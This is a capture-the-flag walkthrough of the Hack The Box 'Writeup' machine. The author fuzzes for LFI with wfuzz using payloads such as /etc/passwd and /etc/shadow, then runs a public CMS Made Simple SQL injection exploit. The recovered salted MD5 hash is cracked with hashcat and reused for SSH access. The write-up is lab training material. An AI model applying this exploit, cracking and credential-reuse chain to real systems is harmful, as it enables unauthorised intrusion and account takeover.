# Website

Nmap found port 80, so I visited the site:

![[Pasted image 20210715202006.png]]

It didn't seem to load. I added `http://` in the browser URL bar and it loaded:

![[Pasted image 20210715202129.png]]

The site seems to be a blog. It mentions already being under attack, and also mentions a domain name (`writeup.htb`). I added this to `/etc/hosts`.

Gobuster failed on my [[Writeups/Hack the Box/Boxes/Writeup/05 - Enumeration#Autorecon|autorecon]] scan - normally I would rerun it manually, but I didn't want to trigger any sort of firewall so I did some manual poking around first.

## Manual Fuzzing

There's nothing interesting in the source, including any links.

I tried `/blog`, `/writeups`, and `/blog/` and `/writeups/` to no avail. There was nothing different on the `http://writeup.htb` page either (sometimes loading the site via its virtual host name gives a different result, but not this time).

When I went to visit `/writeups/` on the domain, I mistyped it and accidentally found the `/writeup/` page:

![[Pasted image 20210715202930.png]]

The page source shows the site runs PHP, and a `?page=` parameter which can be fuzzed for LFI:

![[Pasted image 20210715203034.png]]

The writeups are amusing, but there's no useful info on them:

![[Pasted image 20210715203120.png]]

I tried looking for a few other useful files, like `.git`:

![[Pasted image 20210715203759.png]]

The box mentions vi, so maybe there are swp files:

![[Pasted image 20210715203837.png]]

I checked the robots file, which showed us the `/writeup/` directory:

![[Pasted image 20210715204300.png]]

And I tried to provoke a couple of SQLI errors in the `?page` parameter:

![[Pasted image 20210715204447.png]]

But I didn't have any luck - as this is an easy box, and SQLMap would likely trigger a firewall, I moved on.

I checked what's in the normal wordlists:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ head -100 /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
```

And tried a few other pages from the list, such as `/admin`:

![[Pasted image 20210715205242.png]]

`/admin` asks for creds - I tried `admin`:`admin`, `jkr`:`password`, `jkr`:`admin`, and `jkr`:`writeup`, but none of them worked.

I wondered if `/archive` had anything in it, but it was empty:

![[Pasted image 20210715205357.png]]

None of this manual fuzzing found anything interesting, so I went to try some LFI in the `?page` parameter.

## Trying LFI

I tried some basic LFI first:

![[Pasted image 20210715203218.png]]

I tried a large number of LFIs manually, before switching to `wfuzz`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ wfuzz -u http://writeup.htb/writeups/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://writeup.htb/writeups/index.php?page=FUZZ
Total requests: 257

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000001:   404        9 L      32 W       293 Ch      "/etc/passwd"                                                                                                                           
000000003:   404        9 L      32 W       293 Ch      "/etc/aliases"                                                                                                                          
000000010:   404        9 L      32 W       293 Ch      "/etc/bootptab"                                                                                                                         
...[snip]...                                                                                     
000000240:   404        9 L      32 W       293 Ch      "~/.logout"                                                                                                                             
000000005:   404        9 L      32 W       293 Ch      "/etc/apache2/apache2.conf"                                                                                                             
000000002:   404        9 L      32 W       293 Ch      "/etc/shadow"                                                                                                                           

Total time: 0
Processed Requests: 238
Filtered Requests: 0
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 7: Failed to connect to writeup.htb port 80: Connection refused
```

As expected, this eventually got me blocked.

While I waited, I used `curl` to see if there was a timeout limit specified in the header:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ curl -I writeup.htb
HTTP/1.1 200 OK
Date: Thu, 15 Jul 2021 19:44:32 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Wed, 24 Apr 2019 20:15:00 GMT
ETag: "bd8-5874c5b2a3bbb"
Accept-Ranges: bytes
Content-Length: 3032
Vary: Accept-Encoding
Content-Type: text/html
```

It seemed I'd been unbanned, so it only lasted a couple of minutes. Good to know.

Next I checked if we could grab the index page via the `?page` parameter:

![[Pasted image 20210715203948.png]]

![[Pasted image 20210715204001.png]]

Neither of these worked, so I was pretty confident at this point that LFI wouldn't work.

I tried `wfuzz` one more time, with a delay to try and bypass the WAF:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ wfuzz -u http://writeup.htb/writeups/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -s 1
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://writeup.htb/writeups/index.php?page=FUZZ
Total requests: 257

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000001:   404        9 L      32 W       293 Ch      "/etc/passwd"                                                                                                                       ...[snip]...    

000000029:   404        9 L      32 W       293 Ch      "/etc/httpd/httpd.conf"                                                                                                                 

Total time: 0
Processed Requests: 29
Filtered Requests: 0
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 7: Failed to connect to writeup.htb port 80: Connection refused
```

I got blocked again after 30 requests.

## CMS Made Simple Exploit

After about 45 minutes and a little nudge, I re-checked the source and found areference to a CMS:

```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```

I looked for this in `searchsploit`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ searchsploit "cms made simple"
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                     | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                                                                | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                                                                | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                                                             | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                                                                 | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                      | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                                                                            | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                   | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                       | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                           | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                          | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                    | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                       | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                       | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                                                          | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                                                         | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                       | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                          | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                         | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                           | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                               | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                                                            | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                           | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                               | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                          | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                          | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                                                        | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                               | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                       | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                  | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                         | php/webapps/46546.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

A few of the exploits are authenticated. One is an RCE, but reading the code shows it requires a fresh install. The next best option is the SQL injection.

The exploit, at `php/webapps/46635.py`, seems to do a blind injection via a time based attack. I'll clone it and run it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ searchsploit -m php/webapps/46635.py
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ python2 -m pip install termcolor
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ python2 46635.py -u http://writeup.htb/writeup/
```

It finds us a password hash and salt within a minute!

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

I'll try to find the hash format:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat --example-hashes | grep simple
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat --example-hashes | grep cms
```

Old reliable `hashid` ended up giving us an answer:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashid 62def4866937f08cc13bab43bb14e6f7
Analyzing '62def4866937f08cc13bab43bb14e6f7'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

The `crack_password()` method in the exploit code also tells us it's MD5:

```python
def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()
```

So we can look for md5 in `hashcat`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat --example-hashes | grep md5 -B 1

...[snip]...

MODE: 20
TYPE: md5($salt.$pass)

...[snip]...

```

I added hash:salt to a file:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ echo -n '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
```

And cracked it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat -a 0 -m 20 hash --wordlist /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

...[snip]...

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
Time.Started.....: Thu Jul 15 21:25:19 2021 (4 secs)
Time.Estimated...: Thu Jul 15 21:25:23 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2094.9 kH/s (0.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4360192/14344385 (30.40%)
Rejected.........: 0/4360192 (0.00%)
Restore.Point....: 4359168/14344385 (30.39%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: raymie0506 -> raygan96

Started: Thu Jul 15 21:24:30 2021
Stopped: Thu Jul 15 21:25:24 2021
```

I immediately checked for password reuse and logged in via SSH:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ ssh jkr@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

It worked! We can now grab the user flag:

![[Pasted image 20210715212801.png]]

We can also presumably log in to the admin panel - however, I tried `jkr`:`raykayjay9` and `jkr@writeup.htb`:`raykayjay9` but neither worked.